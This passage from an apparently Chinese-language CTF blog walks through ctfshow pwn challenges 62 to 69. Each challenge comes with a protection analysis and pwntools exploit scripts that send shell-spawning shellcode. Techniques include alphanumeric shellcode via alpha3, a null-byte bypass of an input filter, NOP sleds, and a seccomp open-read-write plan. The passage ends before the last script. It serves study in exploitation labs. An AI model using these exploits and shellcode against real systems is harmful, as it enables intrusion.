*<br>context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28208)<br><br>io.recvuntil(&quot;[&quot;)<br>addr=io.recvuntil(&quot;]&quot;,drop=True)<br>addr=eval(addr)<br>padding=0x10+8<br>shellcode=b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;<br>payload=b&quot;a&quot;*padding+p64(addr+padding+8)+shellcode<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269012847-ce36413f-2972-4514-a721-e006f0444409.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{483688cd-38f3-4c96-b296-9e21a1fd86f3}</p>
<h2 id="pwn63"><a href="#pwn63" class="headerlink" title="pwn63"></a>pwn63</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269032789-e97df5e5-01ce-4077-a889-8a1e5ed4da49.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269083551-ba82459c-7bf2-4302-a1b8-2e8df2a3b6a9.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以看到依旧是一模一样</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269180175-a123909b-2bc6-4095-a63a-f1d13527b3bc.png" srcset="/img/loading.gif" lazyload></p>
<p>跟我想的一样，38变成了37</p>
<p>因为我网上搜到的64位最小都是23位，再小就没得小了</p>
<p>所以这边蛮合理的，那我们刚刚就是这样子啊，完全没区别</p>
<p>还是一样做就行，代码一模一样</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269274740-b4f7b5e8-986a-48c4-ad43-735723286c15.png" srcset="/img/loading.gif" lazyload></p>
<p>因为代码完全一样，所以就不贴了</p>
<p>ctfshow{0b6f6c3a-0709-4945-836f-0019bbffd709}</p>
<h2 id="pwn64"><a href="#pwn64" class="headerlink" title="pwn64"></a>pwn64</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269299788-18ce966c-18d3-469a-b02e-d11400a9f5c0.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269405584-0cc6cda7-21ff-4f84-91a1-890e3068c198.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以看到开了NX，但是根据题目的意思似乎是还是要用shellcode的意思。32位</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269467391-d79d5cbb-15b2-4886-a58c-fd4730646c76.png" srcset="/img/loading.gif" lazyload></p>
<p>原来是用了mmap函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269532428-64018112-a596-445c-8bfe-23e082ae6c99.png" srcset="/img/loading.gif" lazyload></p>
<p>给我们开辟了一块可读可写可执行的区域，buf是这块内存的起始地址</p>
<p>而且我们写的东西是直接进buf存着的啊</p>
<p>所以我们直接写shellcode就好啦</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;i386&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28133)<br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269784568-11cabd7e-cb05-49aa-9147-138994cca12f.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{5871c9cf-9f03-4f0d-adea-b241dce7d79b}</p>
<h2 id="pwn65"><a href="#pwn65" class="headerlink" title="pwn65"></a>pwn65</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269867251-aa29aed3-dc31-4fb3-b9c7-d2ba64bbb267.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269848660-b01786c2-c14e-4f59-8942-6dc4d83d9415.png" srcset="/img/loading.gif" lazyload></p>
<p>给我发个好人卡然后.got和.got.plt全部不可写，这。。</p>
<p>还不让反编译</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760269940663-c6a099ed-eb7b-4efd-ac81-5a5afd4de927.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760318701561-a84bff6a-7a43-41f1-9734-cacde870e30a.png" srcset="/img/loading.gif" lazyload></p>
<p>那我们只能直接看汇编语言了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320107946-5fc345e3-8847-4b7c-886b-1ecfc07f3317.png" srcset="/img/loading.gif" lazyload></p>
<p>在我们input之后会有一个write和一个read</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320197935-60bab79e-afff-4097-b3c9-6a6c92e2a447.png" srcset="/img/loading.gif" lazyload></p>
<p>还有检测环节，我们input进去的必须是在（0x60,0x7A]|(0x40,0x5A]|(0x2F,0x5A])</p>
<p>对应着ASCII码，我们输入的只能是小写字母a-z＋大写字母A-Z＋数字0-9</p>
<p>所以我们这边需要改造我们的shellcode</p>
<p>想做到这一步需要用alpha3这个工具</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320375356-148b7517-2683-4114-94e0-b0843b83f068.png" srcset="/img/loading.gif" lazyload></p>
<p>第一步生成shellcode：sc</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320445870-e03e6f29-b59d-4f34-8731-70e97bff4292.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context.arch=&#x27;amd64&#x27;<br>sc = asm(shellcraft.sh())<br>with open(&#x27;sc&#x27;, &#x27;bw&#x27;) as f:<br>	f.write(sc)<br></code></pre></td></tr></table></figure>

<p>有了sc之后我们将其转化为字符串形式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">python2 ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;sc&quot;<br></code></pre></td></tr></table></figure>

<p>需要放到alpha3的文件夹里</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320538275-24ada64c-32ae-4902-bbe0-4d484a1a58b2.png" srcset="/img/loading.gif" lazyload></p>
<p>得到字符串形式的shellcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t<br></code></pre></td></tr></table></figure>

<p>然后我们将这个shellcode写入代码</p>
<p>注意这边不能用sendline，我们必须使用send</p>
<p>避免sendline会最后输出的\n</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28196)<br><br>payload=b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760320986828-e04896d8-b1f9-4a37-9ce9-d90b1ec4a828.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{a6af34ee-2497-43a0-9254-41bf40cd31f8}</p>
<h2 id="pwn66"><a href="#pwn66" class="headerlink" title="pwn66"></a>pwn66</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321110084-7843de6e-d052-46fb-9c10-5500a6717bd3.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321095734-4512fc8b-1713-418b-9456-58cd692e718e.png" srcset="/img/loading.gif" lazyload></p>
<p>让我们用shellcode结果开了NX吗（？），我猜测可能有mmap这种函数提权</p>
<p>我们先看看main函数</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321145106-ea7fd900-c5bc-40fa-bc85-01cdb53f3f29.png" srcset="/img/loading.gif" lazyload></p>
<p>果然存在mmap，还是7：rwx状态</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321274686-5372b4fb-4b4d-48c5-b5c4-b1c5cf4739df.png" srcset="/img/loading.gif" lazyload></p>
<p>主要是多了一个check部分，这个部分不满足就会回显ERROR然后直接exit了</p>
<p>其实就是验证说最后的payload里的字符是不是都在这个unk_400F20里，都在就过，没有就不许过</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321393740-e7eeb9fd-5f79-4f40-8eed-721af81f74d5.png" srcset="/img/loading.gif" lazyload></p>
<p>大概是这个内容，但是这里边连b都没有啊？</p>
<p>我们可以不能直接用，估计得避开这个绕过了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760321685681-796afdf6-5ebb-4bc7-bf18-119d806f8e65.png" srcset="/img/loading.gif" lazyload></p>
<p>观察到这边的read函数虽然会读0x200个内容</p>
<p>但是内部的check循环是while写的</p>
<p>while只要碰到\x00就停掉了</p>
<p>所以我们只要构造个上来就是\x00的，然后后边加上shellcode就行了，避开了check函数</p>
<p>但是不能只写\x00，必须是合法的汇编语言</p>
<p>我们写\x00B\x00即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28298)<br>front=b&quot;\x00B\x00&quot;<br>shellcode=asm(shellcraft.sh())<br>payload=front+shellcode<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760322938167-4ac84528-7d48-4f31-8fe9-90773e721c4e.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{e5aa8a12-ee38-4a36-8f25-7ead69b7d665}</p>
<h2 id="pwn67"><a href="#pwn67" class="headerlink" title="pwn67"></a>pwn67</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760322959083-22406bd5-04c4-47d1-85b3-fd9ef6111325.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760323017087-5f7e3c50-20e2-4a24-836a-6bfa72699d25.png" srcset="/img/loading.gif" lazyload></p>
<p>开了栈金丝雀，没开NX</p>
<p>32位。。nop雪橇？</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760528203342-9675e33d-49b7-46da-bb00-aba1674b2aba.png" srcset="/img/loading.gif" lazyload></p>
<p>没看懂</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760528678996-9435c6de-e8af-4486-b833-0808e0182be1.png" srcset="/img/loading.gif" lazyload></p>
<p>噢就是搞了一个完全不干事的滑梯，用\x90填满，然后只要落到这个里边就直接飞到shellcode，明白了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760323176092-63e94049-ebf6-4c3b-bd56-c491ef926ddf.png" srcset="/img/loading.gif" lazyload></p>
<p>这边可以观察到需要我们输入两次，一个放到seed里了，一个直接就要我们输入地址放到v5中，甚至还会执行v5（），也就是从这个地址开始执行。</p>
<p>最后还输出了函数query_position地址</p>
<p>过去看看</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760528043202-65871eb4-cd4f-4d0a-ac5a-9b9bbcd365f1.png" srcset="/img/loading.gif" lazyload></p>
<p>这是个什么样子的函数呢，返回的是v1的地址加上一个（-668，668）的一个v2</p>
<p>因为我知道这个position的地址，这个地址是由&amp;v1+v2得到的，我也知道v2的大概区间，所以我可以算出来&amp;v1肯定在一已知的区间里</p>
<p><font style="color:rgb(77, 77, 77);">又因为v1是在query_position函数ebp-0x15的位置</font></p>
<p>由于我也能知道&amp;seed相对于&amp;v1的固定偏移</p>
<p>所以&amp;seed也会在一个区间里</p>
<p>只要我们把大量NOP放在shellcode前，就能有效扩大落脚点，落到那一片就能执行shellcode了</p>
<p>我们要把整个v2都给NOP了，所以NOP写个1336</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760529842547-10e402e3-3f27-4693-9a3e-3bf9853bd438.png" srcset="/img/loading.gif" lazyload></p>
<p>我只要我的落点在（v1，v1+1336），就能有效确保它落在了nop sled上，于是直接滑雪橇过去了</p>
<p>于是第一个payload就是构造这个滑道，前边会铺满\x90的雪花，然后铺1336个之后迎接我们的shellcode</p>
<p>payload&#x3D;b’\x90’*1336+asm(shellcraft.sh())</p>
<p>确定了第一个payload之后我们就要确定第二个payload写啥了</p>
<p>第二个是我们执行的位置，也就是这个（v1，v1+1336）</p>
<blockquote>
<p>栈首先是将调用main函数的函数的ebp压到栈顶，然后push了一个ebx和一个ecx，接着由将esp减少了0x1010，此时栈顶为ebp-0x4-0x4-0x1010，32位一个存储单元4字节。然后呢，又有了esp减去了8，push了一个eax和0，这时栈顶位ebp-0x4-0x4-0x1010-0x8-0x4-0x4。之后呢运行过setbuf函数，esp又增加了0x10，此时esp为ebp-0x4-0x4-0x1010-0x8-0x4-0x4+0x10&#x3D;ebp-0x4-0x4-0x1010。再然后esp又减去了0xc，并且又push了一个eax，那么此时栈顶为ebp-0x4-0x4-0x1010-0xc-0x4。执行完srand函数之后esp又增加了0x10，那么此时的栈顶为ebp-0x4-0x4-0x1010-0xc-0x4+0x10&#x3D;ebp-0x4-0x4-0x1010。之后调用完Louding函数和acquire_satellites函数就是<em>query_position函数了。从IDA反编译结果在</em>query_position函数中就可以看到局部变量相对query_position函数ebp的位置了。</p>
</blockquote>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760529333762-2a675fd6-e6a0-469a-8a1b-ab01cebc2419.png" srcset="/img/loading.gif" lazyload></p>
<p>从栈我们可以看出来<font style="color:rgb(77, 77, 77);">v1距离seed的位置是0x15+0x4+0x4+0x10&#x3D;0x2d</font></p>
<p>根据刚刚的结论<font style="color:rgb(77, 77, 77);">position&#x3D;&amp;v1+v2&#x3D;&amp;v1+random-668(random∈(0,1336))</font></p>
<p><font style="color:rgb(77, 77, 77);">所以&amp;v1&#x3D;position+668-random，&amp;seed&#x3D;&amp;v1+0x2d&#x3D;position+0x2d+668-random</font></p>
<p><font style="color:rgb(77, 77, 77);">我们刚刚的nop大军和shellcode是写在seed里边的</font></p>
<p><font style="color:rgb(77, 77, 77);">那我们就可以将position+0x2d+668输进v5，因为position+0x2d+668&#x3D;&amp;seed+random，由于我们seed大小是0x1000&#x3D;4096，而random是0~1336，所以可以放心加</font></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760530028513-607a5601-617e-4e62-8a3a-0046f0456a6b.png" srcset="/img/loading.gif" lazyload></p>
<p>所以第二个payload发的是<font style="color:rgb(77, 77, 77);">position + 0x2d + 668，这个position直接截取就是了</font></p>
<p><font style="color:rgb(77, 77, 77);">明白了之后直接写代码</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;i386&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28208)<br><br>io.recvuntil(&quot;location: &quot;)<br>addr = eval(io.recvuntil(&quot;\n&quot;,drop=True))<br>shellcode=asm(shellcraft.sh())<br>payload1=b&quot;\x90&quot;*1336+shellcode<br>io.recvuntil(&quot;?\n&gt; &quot;)<br>io.sendline(payload1)<br><br>shell=addr+0x2D+668<br>payload2=hex(shell)<br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760530670755-94c67093-5673-40d8-b17e-691749e40c07.png" srcset="/img/loading.gif" lazyload></p>
<p><font style="color:rgb(77, 77, 77);">ctfshow{cf023956-7f21-45ff-8529-ef32bfb1808f}</font></p>
<p><font style="color:rgb(77, 77, 77);"></font></p>
<p><font style="color:rgb(77, 77, 77);"></font></p>
<h2 id="pwn68"><a href="#pwn68" class="headerlink" title="pwn68"></a><font style="color:rgb(77, 77, 77);">pwn68</font></h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760580663136-2919144a-e007-4d88-a151-48b24f8d9a51.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760581474179-6a68cc07-1a63-45ba-95e4-24c272d0658f.png" srcset="/img/loading.gif" lazyload></p>
<p>一样的啊，就是上一题的64位，这个没有任何区别，只需要改一下context.arch而已，说明我们的shellcode构造方式，别的没啥不一样了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br>context(arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)<br>io=remote(&quot;pwn.challenge.ctf.show&quot;,28141)<br><br>io.recvuntil(&quot;location: &quot;)<br>addr = eval(io.recvuntil(&quot;\n&quot;,drop=True))<br>shellcode=asm(shellcraft.sh())<br>payload1=b&quot;\x90&quot;*1336+shellcode<br>io.recvuntil(&quot;?\n&gt; &quot;)<br>io.sendline(payload1)<br><br>shell=addr+0x2D+668<br>payload2=hex(shell)<br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760581849013-422189a2-1249-4236-9de5-0b2324d48664.png" srcset="/img/loading.gif" lazyload></p>
<p>ctfshow{ad024c12-ec46-454b-8424-7c01cfc9c416}</p>
<h2 id="pwn69"><a href="#pwn69" class="headerlink" title="pwn69"></a>pwn69</h2><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760582600743-1cd053e0-e5dd-45ff-ba9d-bed85ac26b06.png" srcset="/img/loading.gif" lazyload></p>
<p>保护：</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760582580445-2af3036c-0764-4219-a47b-d7a84920c62b.png" srcset="/img/loading.gif" lazyload></p>
<p>欸？什么保护都没有吗</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760582650222-fe1da303-ea84-4db1-932a-4c6448b0ecdf.png" srcset="/img/loading.gif" lazyload></p>
<p>main函数里存在这样子一个栈溢出，而且很好溢出，大概给我们留了0x18的位置</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760582670432-423f8992-9e7f-44f7-975c-d8b36576cc26.png" srcset="/img/loading.gif" lazyload></p>
<p>但。。什么是ORW？</p>
<p>先看看什么叫ORW吧</p>
<h3 id="ORW是什么"><a href="#ORW是什么" class="headerlink" title="ORW是什么"></a>ORW是什么</h3><p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610456281-6200c81f-318d-43fd-94a1-e998ac98f015.png" srcset="/img/loading.gif" lazyload></p>
<p>ORW就是open、read和write的缩写啊</p>
<p>一般是加了个沙箱</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610492602-24300be6-0cfa-4113-b785-7705941a912c.png" srcset="/img/loading.gif" lazyload></p>
<p>禁用了一些内容，使我们没那么容易得到flag</p>
<p>在ctf的pwn题中一般有两种函数调用方式实现沙盒机制，第一种是采用prctl函数调用，第二种是使用seccomp库函数</p>
<p>主要是两种函数，即prtcl()函数和seccomp()函数的调用</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610560984-fab374d7-79ad-455e-b4f7-92a8e0c475c8.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610578730-a00b0d0f-b915-4d07-8d2f-9ee53234f338.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到prctl()函数主要就看第一个参数options</p>
<p>然后seccomp()函数初始化，第二个参数为0表示白名单模式，参数为0x7fff0000U则为黑名单模式</p>
<p>第一个参数是初始化返回值，第三个参数是对应的系统调用号，0–&gt;read&#x2F;1–&gt;write&#x2F;2–&gt;open&#x2F;60–&gt;exit</p>
<p>第四个参数是限制的个数，0就不限制</p>
<p>大概就是这样子，然后靠这俩函数最后搞出个ORW</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760610981372-f417fea0-e1ae-4cfc-ac15-10caaafa9066.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760611002496-7019a2c2-981b-41b7-a407-95c5696c49fa.png" srcset="/img/loading.gif" lazyload></p>
<p>一般用mmap直接给权限？总之这一题算是被说中了，就是溢出大小太小了</p>
<p>本题是seccomp的类型</p>
<p>我们可以先利用seccomp-tools dump .&#x2F;pwn69看看每个区的权限</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760611236902-5ee9f26e-815a-40ad-9bea-a4a5f9be592b.png" srcset="/img/loading.gif" lazyload></p>
<p>还要先提权</p>
<p>我们来看看这个seccomp的内容</p>
<p>首先是说这边检测到了这个系统的arch是X86_64架构的，也就是 64位 x86 架构  ，没问题</p>
<p>由于这边架构正确，所以开始往下走</p>
<p>A &#x3D; sys_number把A的内容寄存为系统调用号</p>
<p>接着if (A &lt; 0x40000000) goto 0005检查是不是属于某个范围的规则。具体来说，<code>0x40000000</code> 表示系统调用号的上限，如果小于这个值，程序将跳转到第 0005 行。  </p>
<p>注意这边第四行是： 如果系统调用号不是 <code>0xffffffff</code>，则跳到第 0010 行（返回 KILL）  </p>
<p>所以我们第0003步就应该小于这个值，然后飞过危险的0004行</p>
<p>而后边几行全部都是看系统调用号是不是rwo，如果是就跳到第0009行</p>
<p>0009行是好的，会return allow</p>
<p>剩下的都是被过滤的</p>
<p>总而言之这个seccomp-tools确实是蛮好用的</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760611912797-aa208025-f0dd-4207-a6c5-c6b50715f4d4.png" srcset="/img/loading.gif" lazyload></p>
<p>大概了解这种ORW的题型之后，我们来看看怎么做题吧</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760612427150-3a5a4764-f368-4b16-a589-efd3665e238b.png" srcset="/img/loading.gif" lazyload></p>
<p>这边果然有一个mmap函数，给的是6的权限，也就是wx，可写可执行，在0x123000的位置长0x1000</p>
<p>后边三个函数，一一看看</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760612483460-fe7b1be4-35c6-4cdb-88eb-06a6262cb562.png" srcset="/img/loading.gif" lazyload></p>
<p>第一个就是沙箱函数，进去就是四条规则</p>
<p>所以我们只能用read，write和open这三条命令来得到flag</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760613473252-8828c461-7cf3-4247-b4e2-3eee979decca.png" srcset="/img/loading.gif" lazyload></p>
<p>第二个函数是setbuf函数</p>
<p>把标准输入、输出、错误的缓冲统统关了，避免数据滞留在缓冲区</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760613754273-f8f51654-dbc9-49c8-8a26-50137be44077.png" srcset="/img/loading.gif" lazyload></p>
<p>最后就是这个小小的栈溢出点</p>
<p>这边太小了，想要大的我们肯定要转战去mmap定义的那块地儿去</p>
<p>我们先在需要干的其实就是首先把最后的shellcode塞在mmap那边，然后跳到mmap那边去</p>
<p>先看看最后的shellcode怎么设立</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">shellcode=asm(shellcraft.open(&quot;./ctfshow_flag&quot;))<br>shellcode+=asm(shellcraft.read(3,mmap_ar,0x100))<br>shellcode+=asm(shellcraft.write(1,mmap_ar,0x100))<br></code></pre></td></tr></table></figure>

<p>shellcode由于只能用这个orw的，所以大概就是这样子三步了，先开，然后读，读完写出来</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760616403708-257f9611-0aa3-4e63-a336-6dd8d71a9311.png" srcset="/img/loading.gif" lazyload></p>
<p>后边我们的问题就是怎么过去，怎么跳到mmap那边去</p>
<p>将栈的内容传输到一个可执行的内存区域</p>
<p>我们一般用的就是栈枢轴</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760615510524-e3f8c4b8-307d-4e29-a6a7-ce9480dabc09.png" srcset="/img/loading.gif" lazyload></p>
<p>通过将栈指针rsp调整到其他的可执行区域来让栈指向那边</p>
<p>所以我们的栈溢出就是用来干这个事情的</p>
<p>我们先填shellcode，把shellcode放进去先，然后填满缓冲区，然后可以操控返回地址了</p>
<p>接着控制修改返回地址为jmp_rsp，执行的时候会跳转到rsp指向的地方</p>
<p>我们最后只要让rsp指向一开始，注意这边我需要多回溯8个，因为要覆盖掉返回地址</p>
<p>我们直接把rsp-0x30，回溯30个，也就是0x28+8，那直接回归我们一开始放shellcode的地方了</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760616171437-d09015ac-532d-4a3a-8a34-e8dfd10235cc.png" srcset="/img/loading.gif" lazyload></p>
<p>我们回溯了0x30位置的rsp后，跳到rsp就行了，然后就重头开始干一遍了，发现头这边有个shellcode，然后就执行去了</p>
<p>这个shellcode里边我们放的是跳到mmap地址的东西，读也读过去</p>
<p>所以明确任务了，我们这边需要先把asm(shellcraft.read(0, mmap_ar, 0x100)) + asm(“mov rax, 0x123000; jmp rax”))放进去，然后用a填满缓冲区，接着写返回地址为rsp，最后来调整栈指针，使其回溯0x30个，执行第一个shellcode去</p>
<p>最后就是一些细枝末节的东西了，比如jmp_rsp是多少</p>
<p>直接ROPgadget –binary “pwn69” –only “jmp|rsp”即可</p>
<p><img src="/CTFshow-Pwn-10%E6%9C%88%E8%AE%B0%E5%BD%95/1760616790515-8e43534f-5baa-439b-b521-d7db655ccafd.png" srcset="/img/loading.gif" lazyload></p>
<p>所以最后是0x0400a01</p>
<p>好我们开始写代码吧</p>
